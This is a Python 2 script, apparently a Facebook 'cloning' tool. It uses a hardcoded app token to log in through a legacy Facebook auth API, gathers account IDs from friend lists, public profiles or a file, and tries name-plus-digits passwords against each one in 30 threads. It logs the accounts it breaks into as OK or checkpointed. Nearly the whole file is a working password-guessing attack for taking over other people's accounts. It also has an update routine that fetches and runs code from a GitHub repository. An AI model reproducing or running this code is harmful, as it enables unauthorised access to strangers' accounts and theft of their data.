#!/usr/bin/python2
#coding=utf-8

import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    os.system('python2 Speedi.py')

from requests.exceptions import ConnectionError
from mechanize import Browser

#### browser ####
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

#### colours ####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'

#### exit ####
def exb():
	print (R + 'Exit')
	os.sys.exit()

#### clear ####
def cb():
    os.system('clear')

#### time sleep ####
def t():
    time.sleep(1)
def t1():
    time.sleep(0.01)

#### print std ####
def psb(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		t1()

#### token remove ####
def trb():
    os.system('rm -rf token.txt')

##### LOGO #####
logo='''                                                                                                                                                    ___   ___ 
\033[1;92m    //   ) )     //   ) )     //   / /     //   / /     //    ) )       / /    
\033[1;92m   ((           //___/ /     //____       //____       //    / /       / /     
\033[1;92m     \\        / ____ /     / ____       / ____       //    / /       / /      
\033[1;92m       ) )    //           //           //           //    / /       / /       
\033[1;92m((___ / /    //           //____/ /    //____/ /    //____/ /     __/ /___     
\033[1;92m................\033[1;96m   FUYAD N1LOY   \033[1;91m...............
\033[1;92m................\033[1;96mâ¬ð¡  ð ðð½'ð¼ ððð£ ðð¤ð¢ð£ ð ðððð, ðð½'ð¼ ð ðð¡ððð  ð  ð¡â¬\033[1;91m..............

\033[1;96mâââââââââââââââââââââââââââââââââââââââââââââ

\033[1;91mâ Auther     : FUYAD NLOYâ
\033[1;92mâ WhatsApp   : 01788402***
\033[1;95mâ Facebook    : https://m.facebook.com/Cyber.POlice.00001

\033[1;96mâââââââââââââââââââââââââââââââââââââââââââââ
                                '''
back=0
successfull=[]
checkpoint=[]
oks=[]
cps=[]
id=[]

#### login ####
def login():
	cb()
	try:
		tb=open('token.txt', 'r')
		menu() 
	except (KeyError,IOError):
		cb()
		print (logo)
		print (R + 'ââââââ·' + S + ' Login With â¬ð½ð²  âá©ð¸ðÐ²Ïï¼¯Ò  âââ¬ ' + R + 'ââââââ')
		print
		id=raw_input(S + '[â] ' + S + 'Email: ' + G +'')
		pwd=getpass.getpass(S + '[â¡] ' + R + 'Password : ')
		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pwd)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
		z=json.load(data)
		if 'access_token' in z:
		    st = open("token.txt", "w")
		    st.write(z["access_token"])
		    st.close()
		    print (S + '[â]' + Y + ' Login successfull 100% â')
		    os.system('xdg-open https://m.facebook.com/Cyber.POlice.00001')
		    menu()
		else:
		    if "www.facebook.com" in z["error_msg"]:
		        print (R + 'Account has a checkpoint !')
		        t()
		        login()
		    else:
		        print (R + 'number/user id/ password is wrong !')
		        trb()
		        t()
		        login()
def menu():
	cb()
	try:
		tb=open('token.txt','r').read()
	except IOError:
		print (R + 'Token Invalid !')
		trb()
		t()
		login()
	try:
		otw=requests.get('https://graph.facebook.com/me?access_token='+tb)
		a=json.loads(otw.text)
	except KeyError:
		print (G + 'Account has a checkpoint !')
		trb()
		t()
		login()
	except requests.exceptions.ConnectionError:
		print (W + 'No internet connection !')
		t()
		exb()
	cb()
	print (logo)
	print (S + '[â] ' + G + 'ID Name: ' + R + a['name'])
	print (S + '[â] ' + G + 'User ID: ' + R + a['id'])
	print
	print (S + 50*'-')
	print
	print (S + '[' + P + 'â1' + S + ']' + S + ' Fast Cloning New Update')
	print (S + '[' + P + 'â2' + S + ']' + S + ' Update Tool')
	print (S + '[' + P + 'â3' + S + ']' + S + '  WhatsApp Group')
	print (S + '[' + Y + 'â4' + S + ']' + G + ' Log Out')
	print (S + '[' + Y + 'â0' + S + ']' + R + ' Exit')
	print
	print (S + 50*'-')
	print
	mb()


def mb():
	bm=raw_input(W + ' â¬âââââââââ¬   ')
	if bm =='':
		print (R + 'Select a valid option !')
		mb()
	elif bm =='1':
		pak()
	elif bm =='2':
	    os.system('rm -rf $HOME/AADI TECH')
	    os.system('cd $HOME && git clone https://github.com/Adeel-khokhar/Speedi')
	    cb()
	    print (logo)
	    psb('â10%')
	    psb('ââ20%')
	    psb('âââ30%')
	    psb('ââââ40%')
	    psb('âââââ50%')
	    psb('ââââââ60%')
	    psb('âââââââ70%')
	    psb('ââââââââ80%')
	    psb('âââââââââ90%')
	    psb('ââââââââââ100%')
	    psb('Frends login new Accountâ')
	    psb('WhatsApp Num 01788402***â')
	    psb('WellCome To Fuyad NIloy')
	    psb('Congratulations Speedi Tool Has Been Updated Successfully')
	    psb('ðUser Nameâ Fuyadâ')
	    psb('ðPassword â N1loyâ')
	    psb('Subscrib My Youtube Chenal Aadi Techâ')
	    psb('Please Login Again')
	    time.sleep(2)
	    os.system('cd $HOME/AkGang && python2 Speedi.py')
	elif bm =='3':
	    os.system('xdg-open https://www.facebook.com/Cyber.POlice.00001')
	    menu()
	elif bm =='4':
		psb('Token Has Been Removed')
		trb()
		t()
		exb()
	elif bm =='0':
	    exb()
	else:
		print (R+'Fill in correctly !')
		mb()


def pak():
	global tb
	try:
		tb=open('token.txt','r').read()
	except IOError:
		print (R + ' Invalid Token !')
		trb()
		t()
		login()
	cb()
	print (logo)
	print (S + '[' + P + 'â1' + S + ']' + P + ' Clone With Friend List')
	print (S + '[' + P + 'â2' + S + ']' + P + ' Clone From Public Account')
	print (S + '[' + Y + 'â3' + S + ']' + Y + ' Clone From File')
	print (S + '[' + R + 'â0' + S + ']' + R + ' Back')
	print
	print (S + 50*'-')
	print
	pb()

def pb():
	bp=raw_input(W + ' â¬ðµð°ð²ð´ð±ð¾ð¾ðºâ¬   ')
	if bp =='':
		print (R + 'Select a valid option !')
		pb()
	elif bp =='1':
		cb()
		print (logo)
		r=requests.get('https://graph.facebook.com/me/friends?access_token='+tb)
		z=json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif bp=='2':
		cb()
		print (logo)
		idt=raw_input(S + '[â] ' + G + 'Put Public User ID/User Name: ' + W + '')
		cb()
		print (logo)
		try:
			jok=requests.get('https://graph.facebook.com/'+idt+'?access_token='+tb)
			op=json.loads(jok.text)
			psb(S + '[â]' + G + ' Account  Name: ' + W + op['name'])
		except KeyError:
			print (R + ' ID not found !')
			raw_input(R + ' Back')
			pak()
		r=requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+tb)
		z=json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif bp =='3':
		cb()
		print (logo)
		try:
			idlist=raw_input(S + '[â] ' + R + 'Enter File Path: ' + G + '')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print (R + ' File Not Fount !')
			raw_input(R + ' Back')
			pak()
	elif bp =='0':
		menu()
	else:
		print (R + ' Select a valid option !')
		pb()
	print (S + '[â]' + P + ' Total Friends: ' + W + str(len(id)))
	psb(S + '[â]' + S + ' To stop process  click on CTRL ~ Z')
	print
	print (S + 50*'-')
	print
	def main(arg):
		global cps, oks
		user=arg
		try:
			h=requests.get('https://graph.facebook.com/'+user+'/?access_token='+tb)
			j=json.loads(h.text)
			ps1=(j['first_name']+'456')
			dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps1)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			k=json.load(dt)
			if 'www.facebook.com' in k['error_msg']:
			    print(S+'[CP] â¡ '+user+' â¡ '+ps1)
			    cps.append(user+ps1)
			else:
			    if 'access_token' in k:
			        print (G+'[OK] â¡ '+user+' â¡ '+ps1)
			        oks.append(user+ps1)
			    else:
			        ps2=(j['first_name']+'123')
			        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps2)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			        k=json.load(dt)
			        if 'www.facebook.com' in k['error_msg']:
			            print(S+'[CP] â¡ '+user+' â¡ '+ps2)
			            cps.append(user+ps2)
			        else:
			            if 'access_token' in k:
			                print(G+'[OK] â¡ '+user+' â¡ '+ps2)
			                oks.append(user+ps2)
			            else:
			                ps3=(j['first_name']+'1234')
			                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps3)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			                k=json.load(dt)
			                if 'www.facebook.com' in k['error_msg']:
			                    print(S+'[CP] â¡ '+user+' â¡ '+ps3)
			                    cps.append(user+ps3)
			                else:
			                    if 'access_token' in k:
			                        print(G+'[OK] â¡ '+user+' â¡ '+ps3)
			                        oks.append(user+ps3)
			                    else:
			                        ps4=(j['first_name']+'12345')
			                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps4)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			                        k=json.load(dt)
			                        if 'www.facebook.com' in k['error_msg']:
			                            print(S+'[CP] â¡ '+user+' â¡ '+ps4)
			                            cps.append(user+ps4)
			                        else:
			                            if 'access_token' in k:
			                                print(G+'[OK] â¡ '+user+' â¡ '+ps4)
			                                oks.append(user+ps4)
			                            else:
			                                ps5=(j['last_name']+'12345')
			                                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps5)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			                                k=json.load(dt)
			                                if 'www.facebook.com' in k['error_msg']:
			                                    print(S+'[CP] â¡ '+user+' â¡ '+ps5)
			                                    cps.append(user+ps5)
			                                else:
			                                    if 'access_token' in k:
			                                        print(G+'[OK] â¡ '+user+' â¡ '+ps5)
			                                        oks.append(user+ps5)
			                                    else:
			                                        ps6=(j['last_name']+'123')
			                                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps6)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			                                        k=json.load(dt)
			                                        if 'www.facebook.com' in k['error_msg']:
			                                            print(S+'[CP] â¡ '+user+' â¡ '+ps6)
			                                            cps.append(user+ps6)
			                                        else:
			                                            if 'access_token' in k:
			                                                print(G+'[OK] â¡ '+user+' â¡ '+ps6)
			                                                oks.append(user+ps6)
		except:
			pass
	p=ThreadPool(30)
	p.map(main, id)
	print
	print(S+50*'-')
	print
	print(S+'Process has been completed CP ID Open After 7 Days ')
	print(Y+'Total '+G+'OK'+S+'/'+P+'CP'+S+' = '+G+str(len(oks))+S+'/'+R+str(len(cps)))
	print(S+'AkGang')     
	print
	raw_input(R + 'Back')
	os.system('python2 Speedi.py')
if __name__=='__main__':
    login()

